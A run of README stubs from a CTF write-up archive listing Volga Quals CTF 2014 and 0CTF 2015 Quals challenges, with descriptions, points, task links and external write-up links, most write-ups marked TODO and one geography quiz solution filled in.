> HINT: Only administrator can get the secret data. Pay attention on links descriptions

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Exploit 300

**Category:** Exploit
**Points:** 300
**Description:**

> Try tasks.2014.volgactf.ru:28113

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/1025>
* <http://sigint.ru/writeups/2014/04/07/volga-ctf-2014-writeups/#exploits-300>
# Volga Quals CTF 2014: Exploit 400

**Category:** Exploit
**Points:** 400
**Description:**

> All friends are together.
> tasks.2014.volgactf.ru:28114
>
> P.S. It's simple.
>
> [https://s3.amazonaws.com/volgactf/exploits/400/exploit400](exploit400)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Exploit 500

**Category:** Exploit
**Points:** 500
**Description:**

> Your main goal is to extract flag from tasks.2014.volgactf.ru:28115
>
> [https://s3.amazonaws.com/volgactf/exploits/500/exploit500](exploit500)
>
> P.S. It's simple.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Joy 100

**Category:** Joy
**Points:** 100
**Description:**

> After many years of living on Mars all the television frequencies were jammed. Its quality is really terrible. To set up your TV and amplify the signal you must enter the number of the season and the series.
>
> btsync: BD2WWICYIDFJI67PN4EM4VI3DFWMPB37C
>
> https://s3.amazonaws.com/volgactf/joy/100/ctfjoy.m2ts
>
> Answer format: num_season_num_serie;num_season_num_serie;...etc...;
> S01E02 == 12
> Example: 123;12;789;

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/1026>
# Volga Quals CTF 2014: Joy 200

**Category:** Joy
**Points:** 200
**Description:**

> è½èŠ±æžã«
> å¸°ã‚‹ã¨è¦‹ã‚Œã°
> èƒ¡è¶ã‹ãª
>
> btsync: B3UTQPMI6AZYCSWZRJSVC7K445ETM766T
>
> [https://s3.amazonaws.com/volgactf/joy/200/japcross.txt](japcross.txt)

## Write-up

(TODO)

## Other write-ups and resources

* <http://singularityctf.blogspot.ru/2014/03/volgactf-quals-2014-writeup-joy-200-eng.html>
* <https://ctfcrew.org/writeup/58>
* <http://sigint.ru/writeups/2014/04/07/volga-ctf-2014-writeups/#joy-200>
# Volga Quals CTF 2014: Joy 300

**Category:** Joy
**Points:** 300
**Description:**

> Comrade, autopilot of our shuttle, that delivers strategic resources, has been broken. You have to take control and reach the destination point (42 parsec).
>
> btsync: BVO4C7GJLM7FWTDN4BOVHUJH6UNXRH3SY
>
> [https://s3.amazonaws.com/volgactf/joy/300/joy300.exe](joy300.exe)

## Write-up

(TODO)

## Other write-ups and resources

* <http://singularityctf.blogspot.ru/2014/04/volgactf-quals-2014-writeup-joy-300-eng.html>
* <http://ctfwriteups.blogspot.de/2014/03/volga-ctf-2014-quals-joy-300.html>
* <http://sigint.ru/writeups/2014/04/07/volga-ctf-2014-writeups/#joy-300>
# Volga Quals CTF 2014: Joy 400

**Category:** Joy
**Points:** 400
**Description:**

> Marsian coders hate cold weather and likes crazy puzzles.
> Weather service API
> http://tasks.2014.volgactf.ru:28154/

## Write-up

(TODO)

## Other write-ups and resources

* <http://lights-out-ctf.ghost.io/volgactf-2014-quals-joy-400/>
# Volga Quals CTF 2014: Joy 500

**Category:** Joy
**Points:** 500
**Description:**

> SaMarsian sniper is watching on you! Hurry up, trace his location by the image!
>
> [https://s3.amazonaws.com/volgactf/joy/500/the+monument+rocket.PSD](the+monument+rocket.PSD)
>
> Correct answer is an address in gmaps format, only the street name and the building number. i.e. Street of Ololo Trololo Tralala, 123. So you should submit OloloTrololoTralala123

## Write-up

(TODO)

## Other write-ups and resources

* <http://juicy-media.ru/dv_team/writeups/index.php?cnt=VolgaCTF&cat=Joy&prc=500>
* <http://singularityctf.blogspot.ru/2014/04/volgactf-quals-2014-writeup-joy-500-eng.html>
* <https://ctfcrew.org/writeup/57>
# Volga Quals CTF 2014 write-ups

* <http://quals.2014.volgactf.ru/>
* [Scoreboard](scoreboard) or [local alternative](scoreboard.txt)

## Completed write-ups

* none yet

## External write-ups only

* [admin100](admin/100)
* [admin200](admin/200)
* [crypto100](crypto/100)
* [crypto200](crypto/200)
* [crypto300](crypto/300)
* [crypto400](crypto/400)
* [exploit100](exploit/100)
* [exploit300](exploit/300)
* [joy100](joy/100)
* [joy200](joy/200)
* [joy300](joy/300)
* [joy400](joy/400)
* [joy500](joy/500)
* [recon100](recon/100)
* [recon200](recon/200)
* [recon300](recon/300)
* [recon400](recon/400)
* [reverse100](reverse/100)
* [reverse400](reverse/400)
* [stegasic200](stegasic/200)
* [web100](web/100)
* [web200](web/200)
* [web300](web/300)
* [web400](web/400)
* [web500](web/500)

## Missing write-ups

* [admin300](admin/300)
* [admin400](admin/400)
* [admin500](admin/500)
* [crypto500](crypto/500)
* [exploit200](exploit/200)
* [exploit400](exploit/400)
* [exploit500](exploit/500)
* [recon500](recon/500)
* [reverse200](reverse/200)
* [reverse300](reverse/300)
* [reverse500](reverse/500)
* [stegasic100](stegasic/100)
* [stegasic300](stegasic/300)
* [stegasic400](stegasic/400)
* [stegasic500](stegasic/500)
# Volga Quals CTF 2014: Recon 100

**Category:** Recon
**Points:** 100
**Description:**

> Good afternoon, recruit! Welcome to Privacy Department. We work closely with all megacorporations and try to help them to save trade secrets. And as you can seeâ€¦ we have a lot of work because some people canâ€™t keep their mouth shut.
> Could you help to Department and find evidences against targets, that weâ€™ll give to you?
> That's a bargain!
> Then hereâ€™s your first objective - Elton Badget. These man wants to disclose the name of secret project. Try to find the leak.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/1027>
# Volga Quals CTF 2014: Recon 200

**Category:** Recon
**Points:** 200
**Description:**

> You are back? Great! Do you want another interesting mission?
> Ok. Colden Hlapton â€“ offender. Heâ€™ll try to send an anonymous message. You must intercept it.
>
> https://www.facebook.com/colden.haulfield.739

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/1028>
# Volga Quals CTF 2014: Recon 300

**Category:** Recon
**Points:** 300
**Description:**

> Another contract. You should find evidence of illegal actions somewhere here
>
> https://www.facebook.com/yan.vetrov.96

## Write-up

(TODO)

## Other write-ups and resources

* <http://singularityctf.blogspot.ru/2014/05/volgactf-quals-2014-writeup-recon-300.html>
* <http://juicy-media.ru/dv_team/writeups/index.php?cnt=VolgaCTF&cat=Recon&prc=300>
# Volga Quals CTF 2014: Recon 400

**Category:** Recon
**Points:** 400
**Description:**

> We have received an information that Eric Livarenz (your target) betrayed his corporation and sold to competitors password from data center. Find the proofs!

## Write-up

(TODO)

## Other write-ups and resources

* <http://singularityctf.blogspot.ru/2014/04/volgactf-quals-2014-writeup-recon-400.html>
# Volga Quals CTF 2014: Recon 500

**Category:** Recon
**Points:** 500
**Description:**

> Thanks for the great help, here's the last job: Stan Swerten - mafia boss, so we pay much more for him, of course. He has brought to us too much troubles. You must find out, what he wants.
>
> HINT: [https://s3.amazonaws.com/volgactf/recon/500/recon500.png](recon500.png)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Reverse 100

**Category:** Reverse
**Points:** 100
**Description:**

> We found a very strange program, but we can't understand what it actually does.
>
> btsync: BWPMMNI7B7PRS5KICN3XMQNZSS6BHU7GN
>
> [https://s3.amazonaws.com/volgactf/reverse/100/rev100](rev100)

## Write-up

(TODO)

## Other write-ups and resources

* <http://singularityctf.blogspot.ru/2014/03/volgactf-quals-2014-writeup-reverse-100.html>
# Volga Quals CTF 2014: Reverse 200

**Category:** Reverse
**Points:** 200
**Description:**

> You just need to put 2 numbers in ascending order without spaces.
>
> btsync: BNBPTYNHZR2FGRLULM5G3XHT4T6XDZK4E
>
> [https://s3.amazonaws.com/volgactf/reverse/200/rev200.exe](rev200.exe)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Reverse 300

**Category:** Reverse
**Points:** 300
**Description:**

> We've managed to obtain a library that converts strings to images. Can you answer what message is hidden in this picture?
>
> btsync: BFBMASRNTYNHT7MPHTJWVFG65IK6HR5KZ
>
> file1 [https://s3.amazonaws.com/volgactf/reverse/300/ARM_LIB.a](ARM_LIB.a)
> file2 [https://s3.amazonaws.com/volgactf/reverse/300/picture.bmp](picture.bmp)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Reverse 400

**Category:** Reverse
**Points:** 400
**Description:**

> Reverse engineering is so exhausting... You are tired, aren't you? Our next challenge will print your the flag without any requirements. You just need to wait a little... Be patient and keep calm :)
>
> [https://s3.amazonaws.com/volgactf/reverse/400/A_little_patience.exe](A_little_patience.exe)
>
> HINT: The result of the algorithm can be computed in a couple of seconds. If you are tired waiting..

## Write-up

(TODO)

## Other write-ups and resources

* <https://zku.github.io/CTF/ctf/reversing/2014/03/31/volgactf-quals-2014-reversing-400.html>
# Volga Quals CTF 2014: Reverse 500

**Category:** Reverse
**Points:** 500
**Description:**

> Hi there, guys! You have already proved your mastery in reverse engineering. Now it's time for a little experiment. This task will require not only RE skills, but also an outstanding knowledge of maths (the server is working on tasks.2014.volgactf.ru:28135).
>
> [https://s3.amazonaws.com/volgactf/reverse/500/Evarist](Evarist)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Stegasic 100

**Category:** Stegasic
**Points:** 100
**Description:**

> We have found an ancient video of the first expedition to Mars. Our scientists suppose that it may contain an encrypted message to descendants. Help us to get it!
>
> btsync: BDEIQNZW6RS3M76QE5AAYRMTX7OZV73OC
>
> [https://s3.amazonaws.com/volgactf/stegasic/100/task.wmv](task.wmv)
>
> HINT: guys, do u love first person shooters?
> HINT UPD: and abbreviations...
> HINT 2: Sometimes the rate of something matters. For example, here's how an 'A' can be encoded.
>
> [https://s3.amazonaws.com/volgactf/stegasic/100/stegasic100.png](stegasic100.png)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Stegasic 200

**Category:** Stegasic
**Points:** 200
**Description:**

> his image is a really huge one. Might it have something embedded in it?
>
> btsync: BWFYZ2SRNTPHGP6MUTIBOEWJ6GQDJMDCD
>
> [https://s3.amazonaws.com/volgactf/stegasic/200/stego200.png](stego200.png)
>
> HINT: Every byte has LSB, even if it isn't a pixel value.
> HINT 2: The password is five-letter word that can be found in many dictionaries.
> HINT 3: Take a close look at the image palette.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctfwriteups.wordpress.com/2014/03/31/volga-ctf-2014-stegano-200-writeup/>
# Volga Quals CTF 2014: Stegasic 300

**Category:** Stegasic
**Points:** 300
**Description:**

> We got a disk imaging rover. There should be a key to start the engine somewhere within. Could you find it?
>
> btsync: B6XCDSDB445255NEFW6O63THSCAN4DM5D
>
> https://s3.amazonaws.com/volgactf/stegasic/300/stego300.tar.gz

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Stegasic 400

**Category:** Stegasic
**Points:** 400
**Description:**

> Poor fellow, it appears the author doesnâ€™t have a band to play in. But heâ€™s eager to be a musician, so this is how he writes the music. Is there anything strange in this one?
>
> [https://s3.amazonaws.com/volgactf/stegasic/400/Jimmy.mp3](Jimmy.mp3)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Stegasic 500

**Category:** Stegasic
**Points:** 500
**Description:**

> The sound may also have some bits embedded. We suspect that the stego bits rate is 120 bpm. Could you extract whatâ€™s inside?
>
> [https://s3.amazonaws.com/volgactf/stegasic/500/stego.wav](http://captf.com/2014/volga-quals/stegasic/500/stego.wav)
>
> HINT: The solution to the task is in the paper "Techniques for Data Hiding" by W. Bender. You can find it in the archive you retrieved (didn't you) solving stegasic 200.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Web 100

**Category:** Web
**Points:** 100
**Description:**

> I wrote a small website. Check it for any errors.
>
> http://tasks.2014.volgactf.ru:28101/

## Write-up

(TODO)

## Other write-ups and resources

* <http://forum4hackers.blogspot.in/2014/07/volga-ctf-quals-2014.html>
* <http://ctfwriteups.blogspot.de/2014/03/volga-ctf-2014-quals-web-100.html>
# Volga Quals CTF 2014: Web 200

**Category:** Web
**Points:** 200
**Description:**

> Unknown Martian was able to log in as admin. WTF?
>
> http://tasks.2014.volgactf.ru:28102/

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/997>
* <http://forum4hackers.blogspot.de/2014/07/volga-ctf-quals-2014.html>
# Volga Quals CTF 2014: Web 300

**Category:** Web
**Points:** 300
**Description:**

> I`m too lazy to explain, just gimme a flag.
>
> http://tasks.2014.volgactf.ru:28103/
>
> HINT: /?e=echo pi

## Write-up

(TODO)

## Other write-ups and resources

* <http://juicy-media.ru/dv_team/writeups/index.php?cnt=VolgaCTF&cat=Web&prc=300>
# Volga Quals CTF 2014: Web 400

**Category:** Web
**Points:** 400
**Description:**

> Twitter-hooitter, homeless shall fall..
> <http://tasks.2014.volgactf.ru:28104/400_f80ebd05004b3578812550cb8e5a3f0d/faces/index.xhtml>

## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://blog.orange.tw/2014/03/volgactf-2014-web-400-write-up.html)
# Volga Quals CTF 2014: Web 500

**Category:** Web
**Points:** 500
**Description:**

> Find The Key
> <http://tasks.2014.volgactf.ru:28105/WebTask_o6z4xaGJg3Uc94MZ0T6W/>
>
> HINT: "RTFM"

## Write-up

(TODO)

## Other write-ups and resources

* <https://rdot.org/forum/showthread.php?p=35191#post35191>
# 0CTF 2015 Quals CTF: GREBeginner

**Category:** Crypto
**Points:** 500
**Solves:** 2
**Description:** 

> [GRE](GREBeginner.zip) is painful!

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/5lipper/d6363e436f08f12f0bbb># 0CTF 2015 Quals CTF: oldcrypto

**Category:** Crypto
**Points:** 200
**Solves:** 58
**Description:**

> [Old crypto](oldcrypto.zip) is not old enough to be broken.
>
> Notice: all in lowercase

## Write-up

(TODO)

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/0ctf/Old%20cryptography/39/)
# 0CTF 2015 Quals CTF: RSA Quine

**Category:** Crypto
**Points:** 300
**Solves:** 13
**Description:** 

> Can you still be yourself after going through all the vicissitudes of life?
>
> [RSA Quine](rsaquine.py)
>
> 202.112.26.105:55537
>
> 202.112.28.114:55537

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2015/03/0ctf-2015-rsaquine/>
* <https://gist.github.com/mheistermann/0dee124d7eed2ec26fcd># 0CTF 2015 Quals CTF: SATBeginner

**Category:** Crypto
**Points:** 300
**Solves:** 15
**Description:** 

> Try SAT if you fail in GRE :P
>
> <202.112.26.111 23333>
>
> <202.112.28.118 23333>

## Write-up

(TODO)

## Other write-ups and resources

* <http://dakutenpura.hatenablog.com/entry/2015/03/31/231219>
* <http://www.hexpedition.com/?p=57>
# 0CTF 2015 Quals CTF: 0ops APP

**Category:** Exploit
**Points:** 500
**Solves:** 10
**Description:** 

> I will not be trapped in the [sandbox](sandbox.zip) forever.
>
> Break it and I am free.
>
> <202.112.26.107:10910>
>
> <202.112.28.116:10910>
> 
> Notice: Ubuntu 14.04.2 LTS

## Write-up

(TODO)

## Other write-ups and resources

* <http://acez.re/ctf-writeup-0ctf-2015-quals-login0opsapp-breaking-out-of-a-pin-sandbox/>
* <https://rzhou.org/~ricky/0ctf2015/0ops_app/>
* <https://gist.github.com/seanwupi/713023672c42aa62ca9e># 0CTF 2015 Quals CTF: FlagGenerator

**Category:** Exploit
**Points:** 250
**Solves:** 49
**Description:** 

> Can you generate the correct flag?
>
> [flagen](flagen)
>
> [libc.so.6](libc.so.6)
>
> <202.112.26.106:5149>
>
> <202.112.28.115:5149>
> 
> Notice: Ubuntu 14.04.2 LTS

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.0x80.org/0ctf-flaggenerator-writeup/>
* <http://itszn.com/blog/?p=17>
* <https://ctf-team.vulnhub.com/0ctf-2015-quals-flagen/> or <http://barrebas.github.io/blog/2015/03/30/0ctf-flagen/>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/03/30/115622)
* [Chinese](https://github.com/0xddaa/blog/blob/master/content/2015/0ctf-exploit-250-FlagGenerator.md)
* [Chinese](http://www.cnhackmy.com/hacked/CTF/2015/09/12/00001682.html)
* <https://rzhou.org/~ricky/0ctf2015/flaggenerator/>
* <https://gist.github.com/seanwupi/37ffc34032c0ada9a9d8>
* <https://gist.github.com/Bono-iPad/bf88be7929fc95217b6d># 0CTF 2015 Quals CTF: freenote

**Category:** Exploit
**Points:** 400
**Solves:** 9
**Description:** 

> [Freenote](freenote), note free.
>
> [libc.so.6](libc.so.6_1)
>
> <202.112.26.108:10001>
>
> <202.112.28.117:10001>
> 
> Notice: Ubuntu 14.04.2 LTS

## Write-up

(TODO)

## Other write-ups and resources

* <https://kitctf.de/writeups/0ctf2015/freenote/>
* [Chinese](http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up)
* <https://rzhou.org/~ricky/0ctf2015/freenote/>
* <https://gist.github.com/seanwupi/929df6655f2acdbab3ff>
# 0CTF 2015 Quals CTF: Login

**Category:** Exploit
**Points:** 300
**Solves:** 40
**Description:** 

> [Login](login) as guest. Logout as root.
>
> [libc.so.6](libc.so.6_1)
>
> <202.112.26.107:10910>
>
> <202.112.28.116:10910>
> 
> Notice: Ubuntu 14.04.2 LTS
>
> The process is protected by a sandbox. So you may not get a shell.
>
> The only thing you can do is reading the "flag".
>
> If you want to break the sandbox, turn to task "0ops APP".

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/0ctf-2015-quals-login/> or <http://barrebas.github.io/blog/2015/03/30/0ctf-login/>
* <http://acez.re/ctf-writeup-0ctf-2015-quals-login0opsapp-breaking-out-of-a-pin-sandbox/>
* <https://github.com/piggybird/ctf/blob/master/0ctf-2015/exploit/login/readme.md>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/03/30/115622)
* [Chinese](http://ddaa.tw/0ctf_exploit_300_login.html)
* <https://rzhou.org/~ricky/0ctf2015/login/>
* <https://gist.github.com/seanwupi/e4b1f039e9f949a7b972># 0CTF 2015 Quals CTF: VBS

**Category:** Exploit
**Points:** 600
**Solves:** 1
**Description:** 

> VBS
> 600 Pts
> 
> Nasty vbscript!
>
> Windows 2012r2
>
> Get the flag C:\flag.txt
>
> [PE file](VBS.exe_)
>
> [Related dll](dll.7z)
>
> <202.112.26.109:12345>
>
> Special thanks to Promised_lu.

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/seanwupi/286c823afe64617c652d># 0CTF 2015 Quals CTF: BabyPolyQuine

**Category:** Misc
**Points:** 100
**Solves:** 76
**Description:** 

> Different people see different me.
>
> But I am always myself.
> 
> <202.112.26.114:12321>
>
> Make the output of your program exactly the same as your source code.
>
> At least 3 correct to get this flag
> 
> $python2 --version
>
> Python 2.7.6
> 
> $python3 --version
>
> Python 3.4.0
> 
> $gcc --version
>
> gcc (Ubuntu 4.8.2-19ubuntu1) 4.8.2
> 
> $ruby --version
>
> ruby 1.9.3p484 (2013-11-22 revision 43786) [x86_64-linux]
> 
> $perl --version
>
> This is perl 5, version 18, subversion 2 (v5.18.2) built for x86_64-linux-gnu-thread-multi

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/0ctf-2015-quals-babypolyquine/>
* <https://github.com/x64x6a/ctf/tree/master/0CTF%202015%20Quals/BabyPolyQuine># 0CTF 2015 Quals CTF: flag sample

**Category:** Misc
**Points:** 10
**Solves:** 648
**Description:** 

> most flags are in the form 0ctf{xxx}, for example 0ctf{enjoyyourgame}

## Write-up

The flag is `0ctf{enjoyyourgame}`.

## Other write-ups and resources

* none yet# 0CTF 2015 Quals CTF: geo newbie

**Category:** Misc
**Points:** 200
**Solves:** 54
**Description:** 

> Talentyange gives lots of tedious apks and you know how bad he is now. Let's try some interesting geography knowledge.
> 
>   nc 202.112.26.111  29995 /  nc 202.112.28.118 29995

## Write-up

by [polym](https://github.com/abpolym)

Connecting to the service, we see that we have to determine [Alpha-2 Codes](http://en.wikipedia.org/wiki/ISO_3166-1_alpha-2) of given Countries in the first level `Level 0` as seen in the [connection log](connection).

Doing that 20 times, we get to level `Level 1`, in which we have to determine Alpha-2 Codes of different cities, tourist attractions and companies.

After doing that 50 times, we get to level `Level 2`. Here, we have to determine Alpha-2 Codes of all countries, in which certain rivers and mountains are.

I wrote a [script](solve.py) that fetches Alpha-2 Codes for certain countries from a html extract of the [Alpha-2 Codes Wikipage](http://en.wikipedia.org/wiki/ISO_3166-1_alpha-2), as well as get the country for a specific city or tourist attraction using [geonames](http://www.geonames.org/) .

In hindsight, I could have just parsed the wikipedia page for each city and tourist attraction, since the author used the English wikipedia entries, e.g. for [Cape Town](http://en.wikipedia.org/wiki/Cape_Town), in which the corresponding country or Alpha-2 Code is listed.

After realizing this and having spent too much time on the automatisation of the task, I statically added answers for level `Level 2` in the last step.

The task had three levels and 75 rounds. However, the author sometimes misspelled certain cities or countries. Adding to that, I had some problems with encoding, so I had to enter some answers statically.

The script also supports caching to reduce the time needed for requests :).

```bash
Which countries does Danube run across?
 Next: Next: Next: Next: Next: Next: Next: Next: Next: 
--- Round 74 ---

Which countries does Alps span?
 Next: Next: Next: Next: Next: Next: Next: 
0CTF{eNj0y_geography_l0v3_7hE_w0lRd}
```

The flag is `0CTF{eNj0y_geography_l0v3_7hE_w0lRd}`.

## Other write-ups and resources

* <http://nullify-ctf.blogspot.com/2015/03/0ctf-2015-quals-misc-geo-newbie.html># 0CTF 2015 Quals CTF: peers

**Category:** Misc
**Points:** 100
**Solves:** 104
**Description:** 

> [peers](peers.pcapng) :P

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/0ctf-2015-quals-peers/># 0CTF 2015 Quals CTF: PolyQuine

**Category:** Misc
**Points:** 300
**Solves:** 28
**Description:** 

> Different people see different me.
>
> But I am always myself.
> 
> <202.112.26.114:12321>
>
> Make the output of your program exactly the same as your source code.
>
> All 5 correct required to get this flag
> 
> $python2 --version
>
> Python 2.7.6
> 
> $python3 --version
>
> Python 3.4.0
> 
> $gcc --version
>
> gcc (Ubuntu 4.8.2-19ubuntu1) 4.8.2
> 
> $ruby --version
>
> ruby 1.9.3p484 (2013-11-22 revision 43786) [x86_64-linux]
> 
> $perl --version
>
> This is perl 5, version 18, subversion 2 (v5.18.2) built for x86_64-linux-gnu-thread-multi

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/x64x6a/ctf/tree/master/0CTF%202015%20Quals/PolyQuine>
* <http://dakutenpura.hatenablog.com/entry/2015/03/31/233058>
# 0CTF 2015 Quals CTF: Treasure

**Category:** Misc
**Points:** 50
**Solves:** 45
**Description:** 

> Romors say that something is buried in treasure.ctf.0ops.sjtu.cn, happy treasure hunting. :)

## Write-up

(TODO)

## Other write-ups and resources

* <https://hexpresso.wordpress.com/2015/03/30/0ctf-2015-treasure-50-writeup/>
* <https://b01lers.net/challenges/0ctf/Treasure/40/># 0CTF 2015 Quals CTF: x-y-z

**Category:** Misc
**Points:** 150
**Solves:** 90
**Description:** 

> [x-y-z](x-y-z)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.pwntester.com/blog/2015/03/30/0ctf-2015-x-y-z/>
* <https://ctf-team.vulnhub.com/0ctf-2015-quals-x-y-z/>
* <http://www.hexpedition.com/?p=7># 0CTF 2015 Quals CTF: dadroid

**Category:** Mobile
**Points:** 400
**Solves:** 4
**Description:** 

> xiaohuajiao says that he is good enough to reverse normal APKs, he want to do something interesting outside APKs. [dadroid](dadroid.zip)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# 0CTF 2015 Quals CTF: dataraider

**Category:** Mobile
**Points:** 150
**Solves:** 8
**Description:** 

> talentyang managed to get a copy of disk image from his rival's cellphone, he wants to know what his rival was plotting recent days, but this image seems to be encrypted. Could you help him?
>
> [image](http://dl.0ops.net/796742312cdd5e7fbfa99d68ecda516e)
>
> or [baidu disk](http://pan.baidu.com/s/1gdBzrxh) password tg08

## Write-up

(TODO)

## Other write-ups and resources

* none yet# 0CTF 2015 Quals CTF: simpleapk

**Category:** Mobile
**Points:** 150
**Solves:** 84
**Description:** 

> This is a simple [apk](simple.apk), Could you find the flag?

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.purpleroc.com/MD/0ctf_WriteUp_Simpleapk.html>
* <http://ipushino.blogspot.de/2015/04/0ops-ctf-qualifiers-2015-simpleapk.html>
# 0CTF 2015 Quals CTF: VEZEL

**Category:** Mobile
**Points:** 100
**Solves:** 105
**Description:** 

> Evermars says he is good at repackaging Android applications, for [example](vezel.apk).

## Write-up

(TODO)

## Other write-ups and resources

* <http://capturetheswag.blogspot.com.au/2015/03/0ops-ctf-qualifiers-2015-vezel-mobile.html>
* <http://dakutenpura.hatenablog.com/entry/2015/03/31/002551>
* <http://www.purpleroc.com/MD/0ctf_WriteUp_vezel.html>
# 0CTF 2015 Quals CTF write-ups

* <https://ctf.0ops.sjtu.cn/>
* [Scoreboard](https://ctf.0ops.sjtu.cn/scoreboard) or [local alternative](scoreboard)
* [Number of solves per task](http://dl.0ops.net/count.txt) or [local alternative](count.txt)
* [Given hints and notes](hints)

## Completed write-ups

* [misc/flag-sample](misc/flag-sample)
* [misc/geo-newbie](misc/geo-newbie)

## External write-ups only

* [crypto/grebeginner](crypto/grebeginner)
* [crypto/oldcrypto](crypto/oldcrypto)
* [crypto/rsa-quine](crypto/rsa-quine)
* [crypto/satbeginner](crypto/satbeginner)
* [exploit/0ops-app](exploit/0ops-app)
* [exploit/flaggenerator](exploit/flaggenerator)
* [exploit/freenote](exploit/freenote)
* [exploit/login](exploit/login)
* [exploit/vbs](exploit/vbs)
* [misc/babypolyquine](misc/babypolyquine)
* [misc/peers](misc/peers)
* [misc/polyquine](misc/polyquine)
* [misc/treasure](misc/treasure)
* [misc/x-y-z](misc/x-y-z)
* [mobile/simpleapk](mobile/simpleapk)
* [mobile/vezel](mobile/vezel)
* [reverse/r0ops](reverse/r0ops)
* [reverse/slimming](reverse/slimming)
* [web/forward](web/forward)
* [web/golden-mac-1](web/golden-mac-1)
* [web/golden-mac-2](web/golden-mac-2)
* [web/lily](web/lily)
* [web/mislead](web/mislead)

## Missing write-ups

* [mobile/dadroid](mobile/dadroid)
* [mobile/dataraider](mobile/dataraider)
* [reverse/combaby](reverse/combaby)
* [reverse/compiler](reverse/compiler)
* [reverse/pipe-worker](reverse/pipe-worker)# 0CTF 2015 Quals CTF: combaby

**Category:** Reverse
**Points:** 400
**Solves:** 4
**Description:** 

> M3med4 specialize in computing. But he is in trouble after picking one strange machine beside JidanGuanbing. Can you help him understand the machine? 
>
> Note: You need to solve slimming first.
>
> [combaby](combaby_data_9cdfd92ac0aa783f2cd33800a55c9a2a)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# 0CTF 2015 Quals CTF: Compiler

**Category:** Reverse
**Points:** 350
**Solves:** 6
**Description:** 

> Yet another part of [compiler](compiler)!!
>
> <202.112.26.112:1339>
>
> <202.112.28.119:1339>
> 
> The flag file is /home/compiler/flag
> 
> Specail thanks to CosineUFO.

## Write-up

(TODO)

## Other write-ups and resources

* none yet# 0CTF 2015 Quals CTF: pipe worker

**Category:** Reverse
**Points:** 300
**Solves:** 14
**Description:** 

> unlimited [pipe works](pipe_worker)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# 0CTF 2015 Quals CTF: r0ops

**Category:** Reverse
**Points:** 150
**Solves:** 45
**Description:** 

> allways [r0ops](r0ops) !

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/kubov/ctf/blob/master/0-ctf/r0ops/writeup.md>
* <https://ctf-team.vulnhub.com/0ctf-2015-quals-r0ops/>
* <http://barrebas.github.io/blog/2015/03/30/0ctf-r0ops/>
# 0CTF 2015 Quals CTF: slimming

**Category:** Reverse
**Points:** 200
**Solves:** 9
**Description:** 

> Foodie has eaten so much delicious food and decide to slim now >_<. 
>
> [slimming](slimming.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://blog.there4ndhere.tk/2015/03/31/0ctf2015-slimming/)# 0CTF 2015 Quals CTF: Forward

**Category:** Web
**Points:** 250
**Solves:** 42
**Description:** 

> Just do it!
>
> <http://202.112.28.121/>
>
> <http://202.112.26.104/>

## Write-up

(TODO)

## Other write-ups and resources

* <https://hexpresso.wordpress.com/2015/03/30/0ctf-2015-forward-250-writeup/>
* <http://www.pwntester.com/blog/2015/03/30/0ctf-short-write-ups/>
* <http://blog.squareroots.de/en/2015/03/0ctf-2015-quals-forward-web250/>
* <https://github.com/x64x6a/ctf/blob/master/0CTF%202015%20Quals/forward/mitm.py>
# 0CTF 2015 Quals CTF: Golden Mac 1

**Category:** Web
**Points:** 300
**Solves:** 7
**Description:** 

> Salt is a programmer. He just got a golden macbook from his hacker friend. It was the first time he use unix like OS and just "chmod 777" to everything for easy access.
>
> One day, Salt put his website online and his hacker friend told him that the website was vulnerable. You smart pentester, can you find some secrets on this webserver?
>
> <http://202.112.26.102/g0ldenM4c/ >
>
> <http://202.112.28.111/g0ldenM4c/>

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/># 0CTF 2015 Quals CTF: Golden Mac 2

**Category:** Web
**Points:** 300
**Solves:** 8
**Description:** 

> I believe you can find more.

## Write-up

(TODO)

## Other write-ups and resources

* <http://whit3hat.com/Golden-Mac-2-writeup.pdf>
* <http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-2-web-300/># 0CTF 2015 Quals CTF: lily

**Category:** Web
**Points:** 150
**Solves:** 38
**Description:** 

